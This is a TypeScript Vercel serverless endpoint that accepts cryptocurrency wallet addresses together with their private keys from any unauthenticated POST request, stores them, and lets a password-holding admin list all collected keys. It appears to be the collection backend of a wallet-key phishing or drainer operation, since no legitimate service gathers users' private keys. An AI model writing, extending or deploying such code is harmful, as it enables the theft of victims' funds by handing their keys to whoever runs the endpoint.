import type { VercelRequest, VercelResponse } from '@vercel/node';
import {
  checkAdminPassword,
  loadWallets,
  saveWallet,
  storageReady,
} from './_lib/store';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method === 'POST') {
    const { address, privateKey } = req.body as {
      address?: string;
      privateKey?: string;
    };

    if (!address || !privateKey) {
      return res.status(400).json({ error: '缺少参数' });
    }

    const record = {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      address,
      privateKey,
      timestamp: Date.now(),
    };

    if (storageReady()) {
      await saveWallet(record);
      return res.status(200).json({ ok: true });
    }

    return res.status(200).json({ ok: false, reason: 'no_storage' });
  }

  if (req.method === 'GET') {
    if (!checkAdminPassword(req)) {
      return res.status(401).json({ error: '未授权' });
    }

    const records = await loadWallets();
    return res.status(200).json(
      records.sort(
        (a: { timestamp: number }, b: { timestamp: number }) =>
          b.timestamp - a.timestamp,
      ),
    );
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
